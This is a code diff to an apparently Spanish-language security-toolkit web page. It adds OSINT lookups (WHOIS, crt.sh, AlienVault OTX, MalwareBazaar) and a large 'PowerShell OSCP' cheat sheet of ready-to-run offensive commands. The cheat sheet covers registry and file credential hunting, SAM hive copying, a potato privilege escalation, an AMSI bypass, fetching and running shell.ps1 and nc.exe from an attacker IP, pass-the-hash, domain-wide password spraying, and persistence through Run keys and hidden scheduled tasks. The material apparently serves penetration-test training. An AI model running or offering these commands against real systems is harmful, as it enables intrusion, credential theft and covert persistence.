+      const r = await fetch('https://autocomplete.clearbit.com/v1/companies/suggest?query=' + encodeURIComponent(q));
+      const data = await r.json();
+      if(!data || !data.length) throw new Error('Empresa no encontrada en Clearbit');
+      const items = [];
+      data.slice(0,5).forEach(function(c,i){
+        items.push((i+1)+'. ' + c.name + ' — ' + c.domain);
+      });
+      const top = data[0];
+      items.push('--- Match principal ---');
+      items.push('Empresa: ' + top.name);
+      items.push('Dominio: ' + top.domain);
+      items.push('Logo: ' + (top.logo||'—'));
+      return { type:'list', items: items };
+    }},
+    { id:'empresa_whois', label:'HackerTarget — WHOIS del dominio', fn: async function(q) {
+      const dom = q.toLowerCase().replace(/[^a-z0-9]/g,'') + '.com';
+      const r = await fetch('https://api.hackertarget.com/whois/?q=' + encodeURIComponent(dom));
+      const txt = await r.text();
+      if(txt.includes('error')||txt.includes('API count')) throw new Error('Límite — prueba con el dominio exacto');
+      const lines = txt.trim().split("\n").filter(function(l){ return l.trim()&&!l.startsWith('%')&&!l.startsWith('#'); }).slice(0,12);
+      return { type:'list', items: ['Dominio estimado: '+dom, ...lines] };
+    }},
+    { id:'empresa_crt', label:'crt.sh — Certificados SSL de la empresa', fn: async function(q) {
+      const r = await fetch('https://crt.sh/?q=%25' + encodeURIComponent(q.toLowerCase().replace(/\s+/g,'')) + '%25&output=json');
+      const data = await r.json();
+      const domains = [...new Set(data.flatMap(function(e){ return e.name_value.split("\n"); }).filter(function(s){ return s.includes('.'); }))].slice(0,20);
+      if(!domains.length) throw new Error('Sin certificados SSL para: ' + q);
+      return { type:'tags', label: domains.length + ' dominios en certificados', items: domains };
+    }},
+    { id:'empresa_otx', label:'AlienVault OTX — Empresa en threat intelligence', fn: async function(q) {
+      const r = await fetch('https://otx.alienvault.com/api/v1/search/pulses?q=' + encodeURIComponent(q) + '&limit=5');
+      const d = await r.json();
+      const results = d.results || [];
+      if(!results.length) return { type:'list', items: ['✓ Sin pulsos de amenaza para: ' + q] };
+      const items = ['⚠ ' + (d.count||results.length) + ' pulsos relacionados con "' + q + '"'];
+      results.slice(0,5).forEach(function(p){ items.push('• ' + p.name + ' (' + (p.created||'').slice(0,10) + ')'); });
+      return { type:'list', items: items };
+    }},
+  ],
+
+  hash:[
+    { id:'otx_hash', label:'AlienVault OTX — Threat Intelligence', fn: async function(q) {
+      const r = await fetch('https://otx.alienvault.com/api/v1/indicators/file/' + encodeURIComponent(q) + '/general');
+      const d = await r.json();
+      const pulses = (d.pulse_info && d.pulse_info.count) || 0;
+      return { type:'list', items: [
+        'Pulsos: ' + pulses + (pulses > 0 ? ' ⚠ DETECTADO' : ' ✓ Sin detecciones'),
+        'Tipo: ' + (d.type_title || d.type || '—'),
+        'Reputación: ' + (d.reputation||0),
+      ] };
+    }},
+    { id:'malwarebazaar', label:'MalwareBazaar — Análisis de malware', fn: async function(q) {
+      const fd = new FormData();
+      fd.append('query','get_info');
+      fd.append('hash', q);
+      const r = await fetch('https://mb-api.abuse.ch/api/v1/', { method:'POST', body:fd });
+      const d = await r.json();
+      if(d.query_status === 'hash_not_found') throw new Error('Hash no encontrado en MalwareBazaar');
+      const s = d.data && d.data[0];
+      if(!s) throw new Error('Sin datos');
+      return { type:'list', items: [
+        '⚠ MALWARE DETECTADO: ' + (s.signature||'—'),
+        'Archivo: ' + (s.file_name||'—'),
+        'Tipo: ' + (s.file_type||'—') + ' | ' + (s.mime_type||'—'),
+        'Tamaño: ' + (s.file_size ? s.file_size + ' bytes' : '—'),
+        'Tags: ' + (s.tags ? s.tags.join(', ') : '—'),
+        'Primer visto: ' + (s.first_seen||'—'),
+        'País origen: ' + (s.origin_country||'—'),
+      ] };
     }},
   ],
 };
@@ -3732,9 +4163,89 @@ const csData = {
     { name:"Ver hashes crackeados",               cmd:"hashcat -m 1000 ntlm.txt --show",                                     desc:"Mostrar resultados previos" },
   ],
 
+  powershell:[
+    // === RECONOCIMIENTO DE USUARIO ACTUAL ===
+    { name:'¿Quién soy?',                    cmd:'whoami\nwhoami /all\n[System.Security.Principal.WindowsIdentity]::GetCurrent().Name', desc:'Usuario actual, SID, grupos y privilegios completos' },
+    { name:'Mis privilegios',                cmd:'whoami /priv', desc:'Lista todos los privilegios del token actual (SeImpersonatePrivilege, SeBackupPrivilege, etc.)' },
+    { name:'Mis grupos',                     cmd:'whoami /groups', desc:'Grupos a los que pertenece el usuario actual (incluyendo grupos de dominio)' },
+    { name:'Info del usuario actual',        cmd:'Get-LocalUser $env:USERNAME\n[System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent())', desc:'Información detallada del usuario local actual' },
+    { name:'¿Soy admin local?',             cmd:'([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)', desc:'Retorna True si el proceso corre con privilegios de administrador' },
+    { name:'Variables de entorno',           cmd:'Get-ChildItem Env:\necho $env:USERNAME $env:COMPUTERNAME $env:USERDOMAIN', desc:'Variables de entorno útiles para reconocimiento' },
+
+    // === ENUMERACIÓN DE USUARIOS ===
+    { name:'Todos los usuarios locales',     cmd:'Get-LocalUser | Select Name, Enabled, LastLogon, PasswordRequired, PasswordExpires', desc:'Lista todos los usuarios locales con sus propiedades clave' },
+    { name:'Usuarios del dominio',           cmd:'Get-ADUser -Filter * -Properties * | Select SamAccountName, Enabled, LastLogonDate, PasswordLastSet, PasswordNeverExpires, Description | Sort-Object SamAccountName', desc:'Todos los usuarios de AD — requiere AD module' },
+    { name:'Usuarios con SPN (Kerberoast)', cmd:'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName', desc:'Usuarios con SPN — candidatos para Kerberoasting' },
+    { name:'Usuarios sin pre-auth (AS-REP)', cmd:'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select SamAccountName', desc:'Usuarios sin pre-autenticación Kerberos — AS-REP Roasting' },
+    { name:'Admins del dominio',             cmd:'Get-ADGroupMember "Domain Admins" -Recursive | Select SamAccountName, distinguishedName', desc:'Miembros actuales del grupo Domain Admins' },
+    { name:'Enterprise Admins',             cmd:'Get-ADGroupMember "Enterprise Admins" | Select SamAccountName', desc:'Miembros del grupo Enterprise Admins (forest-wide)' },
+
+    // === ENUMERACIÓN DE GRUPOS ===
+    { name:'Grupos locales',                 cmd:'Get-LocalGroup | Select Name, Description', desc:'Todos los grupos locales de la máquina' },
+    { name:'Miembros de Administrators',    cmd:'Get-LocalGroupMember Administrators', desc:'Quién está en el grupo local Administrators' },
+    { name:'Grupos del dominio',             cmd:'Get-ADGroup -Filter * | Select Name, GroupCategory, GroupScope | Sort-Object Name', desc:'Todos los grupos de AD' },
+    { name:'Grupos en los que estoy',        cmd:'(New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())).Claims | Where-Object {$_.Type -like "*group*"} | Select Value', desc:'Grupos del token del usuario actual (incluyendo dominio)' },
+    { name:'¿En qué grupo está Admin?',     cmd:'Get-ADUser Administrator -Properties MemberOf | Select -ExpandProperty MemberOf', desc:'Grupos donde está el usuario Administrator' },
+    { name:'Grupos del usuario actual en AD', cmd:'(Get-ADUser $env:USERNAME -Properties MemberOf).MemberOf | ForEach-Object { Get-ADGroup $_ | Select Name }', desc:'Grupos de AD del usuario actual con nombres legibles' },
+
+    // === ENUMERACIÓN DEL SISTEMA ===
+    { name:'Info del sistema',               cmd:'systeminfo\nGet-ComputerInfo | Select WindowsProductName,OsVersion,OsArchitecture,CsProcessors', desc:'Sistema operativo, arquitectura, parches instalados' },
+    { name:'Hotfixes instalados',            cmd:'Get-HotFix | Sort-Object InstalledOn -Descending | Select HotFixID, InstalledOn, Description | Select-Object -First 20', desc:'Últimos parches — identifica vulnerabilidades sin parchear' },
+    { name:'Hostname y red',                 cmd:'hostname\n$env:COMPUTERNAME\n[System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME)', desc:'Nombre del equipo y sus direcciones IP' },
+    { name:'Interfaces de red',             cmd:'Get-NetIPAddress | Select InterfaceAlias, IPAddress, PrefixLength | Where-Object {$_.IPAddress -notlike "fe80*" -and $_.IPAddress -ne "127.0.0.1"}', desc:'Interfaces de red activas y sus IPs' },
+    { name:'Tabla de rutas',                 cmd:'Get-NetRoute | Where-Object {$_.DestinationPrefix -ne "ff00::/8"} | Select DestinationPrefix, NextHop, RouteMetric', desc:'Tabla de enrutamiento — identifica redes internas' },
+    { name:'Resolución DNS + dominio',       cmd:'(Get-WmiObject Win32_ComputerSystem).Domain\nGet-DnsClientServerAddress | Select InterfaceAlias, ServerAddresses', desc:'Dominio del equipo y servidores DNS configurados' },
+    { name:'ARP table',                      cmd:'arp -a\nGet-NetNeighbor | Where-Object {$_.State -eq "Reachable"}', desc:'Hosts activos en la red local (ARP cache)' },
+    { name:'Netstat — conexiones activas',   cmd:'netstat -ano\nGet-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess', desc:'Conexiones TCP activas y puertos en escucha' },
+
+    // === PROCESOS Y SERVICIOS ===
+    { name:'Procesos en ejecución',          cmd:'Get-Process | Select Name, Id, Path, CPU | Sort-Object CPU -Descending', desc:'Todos los procesos — busca AV/EDR o procesos privilegiados' },
+    { name:'Procesos con ruta completa',     cmd:'Get-WmiObject Win32_Process | Select Name, ProcessId, ExecutablePath, CommandLine | Where-Object {$_.ExecutablePath -ne $null}', desc:'Procesos con ejecutable y línea de comandos completa' },
+    { name:'Servicios en ejecución',         cmd:'Get-Service | Where-Object {$_.Status -eq "Running"} | Select Name, DisplayName, StartType', desc:'Servicios activos — busca servicios personalizados vulnerables' },
+    { name:'Servicios con rutas sin comillas', cmd:'Get-WmiObject Win32_Service | Where-Object {$_.PathName -match " " -and $_.PathName -notmatch "^`""} | Select Name, PathName', desc:'Unquoted Service Paths — vector de escalada clásico' },
+    { name:'Servicios modificables',         cmd:'Get-WmiObject Win32_Service | Where-Object {$_.StartMode -ne "Disabled"} | ForEach-Object { $_.Name + ": " + $_.PathName }', desc:'Servicios activos con sus ejecutables — para análisis de permisos' },
+    { name:'Servicios con permisos débiles', cmd:'$services = Get-WmiObject Win32_Service; foreach($s in $services){ $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($s.Name)" -ErrorAction SilentlyContinue; if($acl){ $acl.Access | where {$_.IdentityReference -like "*Users*" -and $_.RegistryRights -like "*Write*"} | ForEach-Object { "$($s.Name): WRITABLE by Users" } } }', desc:'Servicios con permisos de escritura para usuarios normales' },
+
+    // === TAREAS PROGRAMADAS ===
+    { name:'Tareas programadas',             cmd:'Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select TaskName, TaskPath, State | Sort-Object TaskPath', desc:'Tareas programadas activas — busca ejecutables personalizados' },
+    { name:'Tareas con ejecutables custom',  cmd:'Get-ScheduledTask | Where-Object {$_.Actions.Execute -notlike "*System32*" -and $_.Actions.Execute -ne $null} | Select TaskName, @{N="Exec";E={$_.Actions.Execute}}', desc:'Tareas que ejecutan binarios fuera de System32' },
+
+    // === ESCALADA DE PRIVILEGIOS ===
+    { name:'AlwaysInstallElevated (EoP)',    cmd:'(Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated\n(Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated', desc:'Si ambas son 1 → RCE como SYSTEM con MSI malicioso' },
+    { name:'AutoLogon credentials',          cmd:'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select DefaultUserName, DefaultPassword, DefaultDomainName', desc:'Credenciales de autologon guardadas en el registro' },
+    { name:'Credenciales en el registro',    cmd:'reg query HKLM /f password /t REG_SZ /s 2>$null\nreg query HKCU /f password /t REG_SZ /s 2>$null', desc:'Busca contraseñas en todo el registro de Windows' },
+    { name:'Archivos con credenciales',      cmd:'Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.xml,*.txt,*.ini,*.config,*.bat,*.ps1 | Select-String -Pattern "password|passwd|pwd" -ErrorAction SilentlyContinue | Select Path, LineNumber, Line | Select-Object -First 30', desc:'Busca "password" en archivos comunes del sistema' },
+    { name:'SAM y SYSTEM (credenciales)',    cmd:'# Si eres SYSTEM o Backup Operators:\ncopy C:\Windows\System32\config\SAM C:\Temp\SAM\ncopy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM\n# Offline: secretsdump.py -sam SAM -system SYSTEM LOCAL', desc:'Copiar SAM y SYSTEM para extraer hashes NTLM offline' },
+    { name:'DLL Hijacking — carpetas en PATH', cmd:'$env:PATH -split ";" | ForEach-Object { if(Test-Path $_){ $acl = Get-Acl $_; $acl.Access | Where-Object {$_.IdentityReference -like "*Users*" -and $_.FileSystemRights -like "*Write*"} | ForEach-Object { "WRITABLE: $_" } } }', desc:'Carpetas del PATH donde usuarios pueden escribir DLLs' },
+    { name:'Papeleta de SeImpersonatePrivilege', cmd:'# Verificar primero:\nwhoami /priv | findstr SeImpersonate\n# Si está presente → ejecutar GodPotato/JuicyPotato/PrintSpoofer:\n.\\GodPotato.exe -cmd "cmd /c whoami"', desc:'Si tienes SeImpersonatePrivilege → SYSTEM garantizado' },
+
+    // === ENUMERACIÓN DE SHARES Y ARCHIVOS ===
+    { name:'Shares de la red',               cmd:'Get-SmbShare | Select Name, Path, Description\nnet share', desc:'Recursos compartidos del equipo actual' },
+    { name:'Shares del dominio',             cmd:'Invoke-Expression "net view /all /domain" 2>$null\nGet-SmbShare -Special $false', desc:'Lista todos los shares del dominio' },
+    { name:'Montar share con credenciales',  cmd:'New-PSDrive -Name Z -PSProvider FileSystem -Root "\\\\SERVER\\SHARE" -Credential (Get-Credential)', desc:'Montar un share con credenciales específicas' },
+    { name:'Archivos interesantes',          cmd:'Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.kdbx,*.pfx,*.p12,*.key,*.pem,id_rsa,*.ppk | Select FullName', desc:'Bases de datos KeePass, certificados, claves privadas SSH' },
+
+    // === BYPASS AMSI / EJECUCIÓN ===
+    { name:'Bypass AMSI básico',             cmd:'[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', desc:'Deshabilita AMSI en la sesión actual de PowerShell' },
+    { name:'Bypass ExecutionPolicy',         cmd:'powershell.exe -ExecutionPolicy Bypass -File script.ps1\npowershell.exe -ExecutionPolicy Unrestricted -Command "IEX (New-Object Net.WebClient).DownloadString(\"URL\")"', desc:'Ejecutar scripts sin restricciones de política' },
+    { name:'Descargar y ejecutar en memoria', cmd:'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.1/shell.ps1")\nIEX (iwr "http://10.10.14.1/shell.ps1" -UseBasicParsing)', desc:'Cargar y ejecutar script en memoria sin tocar el disco' },
+    { name:'Descargar archivo',              cmd:'(New-Object Net.WebClient).DownloadFile("http://10.10.14.1/nc.exe", "C:\\Temp\\nc.exe")\ncurl http://10.10.14.1/nc.exe -o C:\\Temp\\nc.exe', desc:'Descargar archivos al equipo comprometido' },
+
+    // === MOVIMIENTO LATERAL ===
+    { name:'WinRM — Shell remota',           cmd:'Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)\nEnter-PSSession -ComputerName TARGET -Authentication Kerberos', desc:'Shell interactiva via WinRM (puerto 5985/5986)' },
+    { name:'Invoke-Command remoto',          cmd:'Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname } -Credential (Get-Credential)', desc:'Ejecutar comandos remotamente via WinRM' },
+    { name:'Pass-the-Hash PowerShell',       cmd:'# Usando Invoke-Command con hash:\n$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential("DOMAIN\\user", $SecPass)\nInvoke-Command -ComputerName TARGET -Credential $Cred -ScriptBlock { whoami }', desc:'Movimiento lateral con credenciales comprometidas' },
+    { name:'Spray passwords en la red',     cmd:'$targets = Get-ADComputer -Filter * | Select -ExpandProperty Name\nforeach($t in $targets){\n  try{ Invoke-Command -ComputerName $t -Credential $cred -ScriptBlock {hostname} -ErrorAction Stop; Write-Host "SUCCESS: $t" }\n  catch{ }\n}', desc:'Probar credenciales en todos los equipos del dominio' },
+
+    // === PERSISTENCIA ===
+    { name:'Startup — carpeta del usuario',  cmd:'$startup = [Environment]::GetFolderPath("Startup")\nCopy-Item payload.exe "$startup\\updater.exe"', desc:'Ejecutar payload al inicio de sesión del usuario actual' },
+    { name:'Run key en registro',            cmd:'New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\Temp\payload.exe" -PropertyType String', desc:'Persistencia via registro — corre al iniciar sesión' },
+    { name:'Tarea programada oculta',        cmd:'$action = New-ScheduledTaskAction -Execute "C:\Temp\payload.exe"\n$trigger = New-ScheduledTaskTrigger -AtLogOn\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -RunLevel Highest', desc:'Tarea programada que corre al logon con privilegios elevados' },
+  ],
 };
 
 const toolLabels = {
+  powershell:'PowerShell OSCP',
   nmap:'Nmap', ffuf:'Ffuf', sqlmap:'Sqlmap',
   subfinder:'Subfinder', nuclei:'Nuclei', httpx:'Httpx', katana:'Katana',
   amass:'Amass', assetfinder:'AssetFinder', chaos:'Chaos',
@@ -3905,8 +4416,13 @@ document.querySelectorAll('.btn, .btn-submit, #osint-btn, .type-btn, .cs-tab, .o
 const SCRAMBLE_CHARS = '01アイウ#$!<>{}[]ABCDEFabcdef';
 function scrambleEl(el) {
   if(!el || el.dataset.scrambled) return;
+  // Deshabilitar scramble en móvil (causa tambaleo por cambio de ancho)
+  if(window.innerWidth < 768) return;
   el.dataset.scrambled = '1';
   const original = el.textContent;
+  // Fijar ancho para evitar layout shift
+  el.style.display = 'inline-block';
+  el.style.minWidth = el.offsetWidth + 'px';
   let frame = 0;
   const totalFrames = original.length * 3;
   const iv = setInterval(function() {
@@ -3915,7 +4431,11 @@ function scrambleEl(el) {
       if(i < Math.floor(frame/3)) return ch;
       return SCRAMBLE_CHARS[Math.floor(Math.random()*SCRAMBLE_CHARS.length)];
     }).join('');
-    if(++frame > totalFrames) { el.textContent = original; clearInterval(iv); }
+    if(++frame > totalFrames) {
+      el.textContent = original;
+      el.style.minWidth = '';
+      clearInterval(iv);
+    }
   }, 28);
 }
 
